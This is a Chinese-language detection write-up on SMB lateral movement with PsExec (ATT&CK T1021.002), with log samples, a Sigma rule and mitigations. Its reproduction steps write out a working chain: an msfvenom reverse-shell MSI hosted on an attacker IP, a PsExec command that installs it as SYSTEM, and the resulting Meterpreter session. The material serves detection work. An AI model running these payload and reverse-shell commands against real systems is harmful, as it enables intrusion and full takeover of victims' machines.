# T1021-002-Win-基于白名单PsExec执行Payload

## 描述

攻击者可能利用有效帐户通过服务器消息块（SMB）协议访问远程网络共享（如`C$`、`ADMIN$`、`IPC$`），以登录用户身份执行操作。SMB是Windows系统中用于文件、打印机和串行端口共享的协议，Linux和macOS通过Samba实现类似功能。Windows的隐藏管理员共享仅限管理员访问，支持远程文件复制和管理功能。攻击者结合管理员级凭据，通过SMB实现横向移动、文件传输或远程执行。PsExec是Sysinternals Suite的轻量级工具，允许在远程系统上执行进程，常被攻击者用于通过`IPC$`共享部署和执行恶意Payload（如Meterpreter），实现反弹Shell或其他恶意操作。

## 测试案例

### 用例
- **横向移动**：使用PsExec通过`IPC$`共享在远程系统上执行命令或Payload。
- **Payload部署**：通过`ADMIN$`共享上传恶意文件，随后使用PsExec执行。
- **反弹Shell**：利用PsExec运行Meterpreter Payload，建立与攻击者C2服务器的连接。
- **持久化**：通过PsExec创建计划任务或服务，确保恶意代码持续运行。

### 示例场景
- 攻击者使用PsExec通过SMB在目标系统上运行`msiexec.exe`，安装从远程服务器下载的恶意MSI文件（`shellcode.msi`），建立Meterpreter反弹Shell。
- 利用管理员凭据访问`IPC$`共享，执行远程命令。

### 路径
- PsExec：通常由攻击者手动部署，路径如：
  ```yml
  - C:\Users\<username>\Desktop\PSTools\PsExec.exe
  - C:\Temp\PsExec.exe
  ```
- PSEXESVC：PsExec在目标系统创建的服务，路径：
  ```yml
  - C:\Windows\PSEXESVC.exe
  ```

### 所需权限
- 管理员权限（访问管理员共享、执行PsExec）。
- 有效凭据或NTLM哈希（通过传递哈希攻击）。

### 操作系统
- Windows 7、Windows 8、Windows 8.1、Windows 10、Windows 11、Windows Server 2008、2012、2016、2019、2022。

## 检测日志

### Windows安全日志
- **事件ID 4688**：记录`PsExec.exe`、`PSEXESVC.exe`或`msiexec.exe`进程创建及命令行参数（需启用命令行审核）。
- **事件ID 5140**：记录网络共享访问（如`IPC$`）。
- **事件ID 5145**：记录详细的共享访问（如`PSEXESVC`文件）。
- **事件ID 4624**：记录网络登录事件（类型3，可能涉及SMB）。
- **事件ID 4672**：记录分配给新登录的安全特权（如管理员登录）。

### Sysmon日志
- **事件ID 1**：捕获`PsExec.exe`、`PSEXESVC.exe`或`msiexec.exe`进程创建及命令行参数。
- **事件ID 3**：记录SMB连接（TCP 445端口）的网络活动。
- **事件ID 11**：记录共享中文件的创建或修改（如`PSEXESVC.exe`）。
- **事件ID 7**：记录模块加载（如恶意MSI加载的DLL）。

### Netflow日志
- 捕获TCP 445端口的SMB流量及TCP 4444端口的反弹Shell流量。

## 测试复现

### 环境准备
- **攻击机**：Kali Linux 2019（或其他支持Metasploit的系统）。
- **靶机**：Windows 7/10/11或Windows Server 2012/2016（已启用SMB和管理员共享）。
- **权限**：域管理员或本地管理员凭据。
- **工具**：
  - Metasploit Framework（生成Payload和监听反弹Shell）。
  - PsExec（从https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec获取）。
  - Sysmon（监控进程和网络活动）。
  - Wireshark（捕获SMB和反弹Shell流量）。
- **网络**：隔离网络环境，允许TCP 445和4444端口流量。
- **日志**：启用Windows安全日志（配置审核进程创建）、Sysmon日志和Netflow日志。
  - 启用命令行记录：
    ```
    本地计算机策略 > 计算机配置 > 管理模板 > 系统 > 审核进程创建 > 在过程创建事件中加入命令行 > 启用
    ```

### 攻击步骤
1. **配置Metasploit监听器（攻击机）**：
   ```bash
   msf5 > use exploit/multi/handler
   msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
   msf5 exploit(multi/handler) > set lhost 192.168.126.146
   msf5 exploit(multi/handler) > set lport 4444
   msf5 exploit(multi/handler) > exploit
   ```
2. **生成恶意Payload（攻击机）**：
   ```bash
   msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f msi > shellcode.msi
   ```
   - 托管`shellcode.msi`于攻击机的Web服务器：
     ```bash
     python3 -m http.server 80
     ```
3. **执行PsExec（靶机）**：
   - 将`PsExec.exe`复制到靶机（如`C:\Users\12306Br0\Desktop\PSTools\PsExec.exe`）。
   - 以管理员权限运行：
     ```dos
     PsExec.exe -d -s msiexec.exe /q /i http://192.168.126.146/shellcode.msi
     ```
     - 参数说明：
       - `-d`：非交互模式，后台运行。
       - `-s`：以SYSTEM权限运行。
       - `/q`：安静模式，无用户界面。
       - `/i`：安装MSI文件。
4. **获取反弹Shell（攻击机）**：
   - Metasploit接收Meterpreter会话：
     ```
     [*] Started reverse TCP handler on 192.168.126.146:4444
     [*] Sending stage (180291 bytes) to 192.168.126.149
     [*] Meterpreter session 1 opened (192.168.126.146:4444 -> 192.168.126.149:49371) at 2025-06-08 04:24:44 +0800
     meterpreter > getuid
     Server username: NT AUTHORITY\SYSTEM
     ```
5. **验证结果**：
   - 检查靶机是否创建`C:\Windows\PSEXESVC.exe`。
   - 使用Wireshark捕获TCP 445（SMB）和TCP 4444（反弹Shell）流量。
   - 验证Sysmon日志是否记录`PsExec.exe`、`PSEXESVC.exe`和`msiexec.exe`的进程创建。
6. **清理**：
   - 靶机：
     ```dos
     del C:\Windows\PSEXESVC.exe
     del C:\Users\12306Br0\Desktop\PSTools\PsExec.exe
     ```
   - 攻击机：
     ```bash
     rm shellcode.msi
     ```

## 测试留痕
以下为Windows安全日志示例（事件ID 4688，PsExec进程创建）：
```yml
EventID: 4688
TimeCreated: 2025-06-08T04:24:29.237Z
Channel: Security
Hostname: WIN7-TARGET
SubjectUserSid: S-1-5-21-1234567890-123456789-1234567890-1001
SubjectUserName: 12306Br0
SubjectDomainName: 12306Br0-PC
SubjectLogonId: 0x6e1ea
NewProcessId: 0xe84
NewProcessName: C:\Users\12306Br0\Desktop\PSTools\PsExec.exe
ProcessCommandLine: PsExec.exe -d -s msiexec.exe /q /i http://192.168.126.146/shellcode.msi
CreatorProcessId: 0xdac
CreatorProcessName: C:\Windows\System32\cmd.exe
TokenElevationType: %%1936
```

以下为Sysmon日志示例（事件ID 1，PSEXESVC创建）：
```yml
EventID: 1
UtcTime: 2025-06-08T04:24:29.284Z
ProcessGuid: {bb1f7c32-1829-5e9b-0000-00108c864001}
ProcessId: 4044
Image: C:\Windows\PSEXESVC.exe
FileVersion: 2.2
Description: PsExec Service
Product: Sysinternals PsExec
Company: Sysinternals
CommandLine: C:\Windows\PSEXESVC.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonId: 0x3e7
IntegrityLevel: System
Hashes: SHA1=A17C21B909C56D93D978014E63FB06926EAEA8E7
ParentProcessId: 496
ParentImage: C:\Windows\System32\services.exe
```

以下为Windows安全日志示例（事件ID 5140，IPC$访问）：
```yml
EventID: 5140
TimeCreated: 2025-06-08T04:24:29.456Z
Channel: Security
Hostname: WIN7-TARGET
SubjectUserName: 12306Br0
SubjectDomainName: 12306Br0-PC
ShareName: \\*\IPC$
SourceAddress: fe80::719e:d312:648f:4884
SourcePort: 49369
```

## 检测方法/思路

### Sigma规则
基于Sigma规则，检测PsExec执行Payload的行为：

```yml
title: Suspicious PsExec Execution via Admin Shares
id: d9e8f7c6-6a5b-7c8d-9f0e-5b4c6d7e8f9b
status: experimental
description: Detects PsExec execution accessing admin shares to deploy payloads
references:
- https://attack.mitre.org/techniques/T1021/002
- https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    EventID: 4688
    Image|endswith:
      - '\PsExec.exe'
      - '\PSEXESVC.exe'
  condition: selection
falsepositives:
- Legitimate administrative use of PsExec by IT staff
- System maintenance tasks
level: high
```

### 检测思路
1. **进程监控**：
   - 检测`PsExec.exe`和`PSEXESVC.exe`进程创建，尤其是命令行包含`msiexec.exe`或`.msi`。
   - 监控异常父进程（如`cmd.exe`、`powershell.exe`）调用PsExec。
2. **共享访问监控**：
   - 检测`IPC$`、`C$`或`ADMIN$`共享的访问（事件ID 5140、5145）。
   - 检查共享访问的相对目标名称（如`PSEXESVC`）。
3. **网络监控**：
   - 检测TCP 445端口的SMB流量，尤其是与`IPC$`共享的连接。
   - 监控TCP 4444等非标准端口的反弹Shell流量。
4. **文件监控**：
   - 检测`C:\Windows\PSEXESVC.exe`的创建或异常MSI文件的下载。
5. **行为基线**：
   - 建立组织内PsExec和SMB共享的正常使用模式，识别异常行为（如夜间执行、非管理员用户）。

### 检测建议
- **Sysmon配置**：配置Sysmon监控进程创建（事件ID 1）、网络连接（事件ID 3）和文件操作（事件ID 11）。
- **命令行记录**：启用Windows安全日志的命令行审核，捕获PsExec的详细参数。
- **EDR监控**：使用EDR工具（如Microsoft Defender for Endpoint）检测PsExec执行和SMB共享访问。
- **误报过滤**：排除IT管理员的合法PsExec使用，结合上下文（如用户身份、目标IP）降低误报率。

## 缓解措施
1. **共享访问控制**：
   - 禁用不必要的管理员共享：
     ```bash
     reg add "HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareServer /t REG_DWORD /d 0 /f
     ```
   - 限制对`C$`、`ADMIN$`和`IPC$`的访问，仅允许特定用户或IP。
2. **凭据保护**：
   - 启用多因素认证（MFA）保护管理员账户。
   - 限制NTLM哈希传递攻击（如启用Kerberos或禁用NTLM）。
3. **应用白名单**：
   - 使用AppLocker或WDAC限制`PsExec.exe`和非系统工具的执行。
4. **网络限制**：
   - 配置防火墙阻止未经授权的TCP 445流量。
   - 使用网络分段隔离敏感系统。
5. **补丁管理**：
   - 确保系统安装最新补丁，防止SMB协议漏洞（如EternalBlue）。

## 参考推荐
- MITRE ATT&CK T1021.002  
  https://attack.mitre.org/techniques/T1021/002  
- PsExec官方文档  
  https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec  
- 基于白名单PsExec执行Payload  
  https://blog.csdn.net/ws13129/article/details/89879771
